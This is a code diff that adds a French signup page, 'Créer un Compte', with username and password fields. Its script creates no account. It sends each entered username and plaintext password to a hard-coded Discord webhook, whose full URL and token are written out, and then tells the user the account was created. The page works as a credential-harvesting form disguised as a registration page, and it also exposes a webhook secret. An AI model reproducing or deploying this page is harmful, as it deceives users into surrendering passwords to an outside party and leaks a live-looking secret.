@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Créer un Compte</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f0f0f0;
+      margin: 0;
+    }
+
+    .form-container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      width: 300px;
+    }
+
+    .form-container input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .form-container button {
+      width: 100%;
+      padding: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .form-container button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+    <h2>Créer un Compte</h2>
+    <form id="signupForm">
+      <input type="text" id="username" placeholder="Pseudo" required />
+      <input type="password" id="password" placeholder="Mot de passe" required />
+      <button type="submit">S'inscrire</button>
+    </form>
+  </div>
+
+  <script>
+    // Fonction pour envoyer les données au webhook Discord
+    async function sendToDiscord(pseudo, motDePasse) {
+      const webhookUrl = "https://discord.com/api/webhooks/1358389159127154748/Xt096LVu3tzwb-Pc8KK1wwrIuzN4ubavLDXafCoYaw6FgwG5RLE232xY0ItvJUyxUC3E";
+
+      const data = {
+        content: `**Nouveau Compte Créé**\nPseudo: ${pseudo}\nMot de passe: ${motDePasse}`
+      };
+
+      const response = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      });
+
+      if (response.ok) {
+        alert("Compte créé avec succès !");
+      } else {
+        alert("Une erreur est survenue lors de l'envoi des données.");
+      }
+    }
+
+    // Écoute l'événement de soumission du formulaire
+    document.getElementById("signupForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      const pseudo = document.getElementById("username").value;
+      const motDePasse = document.getElementById("password").value;
+
+      sendToDiscord(pseudo, motDePasse);
+    });
+  </script>
+</body>
+</html>
